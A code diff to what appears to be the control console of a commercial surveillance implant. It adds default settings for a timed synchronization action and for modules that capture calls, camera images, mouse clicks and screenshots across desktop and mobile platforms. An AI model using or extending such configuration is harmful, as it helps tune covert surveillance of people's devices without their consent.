@@ -15,8 +15,15 @@ package it.ht.rcs.console
       
       var config:Object = {};
       config.modules = getModules();
-      config.events  = [{desc: "SYNC", event: "timer", repeat: 0, delay: 60}];
-      config.actions = [{desc: "SYNC", subactions: [{action: "synchronize"}]}];
+      config.events  = [{ desc: "SYNC", event: "timer", type: "loop", repeat: 0, delay: 60, ts: "00:00:00", te: "23:59:59", enabled: true }];
+      config.actions = [{ desc: "SYNC", subactions: [{ action: "synchronize",
+                                                       host: "",
+                                                       bandwidth: 1000000,
+                                                       mindelay: 0,
+                                                       maxdelay: 0,
+                                                       stop: false,
+                                                       wifi: false,
+                                                       cell: false }] }];
       config.globals = getGlobals();
       
       return config;
@@ -46,12 +53,15 @@ package it.ht.rcs.console
         
         {
           module: "call",
+          buffer: 524288,
+          compression: 5,
           _type: "desktop,mobile",
           _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
         },
         
         {
           module: "camera",
+          quality: "med",
           _type: "desktop,mobile",
           _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
         },
@@ -128,6 +138,8 @@ package it.ht.rcs.console
         
         {
           module: "mouse",
+          width: 40,
+          height: 40,
           _type: "desktop",
           _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
         },
@@ -152,6 +164,8 @@ package it.ht.rcs.console
         
         {
           module: "screenshot",
+          onlywindow: false,
+          quality: "med",
           _type: "desktop,mobile",
           _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
         },
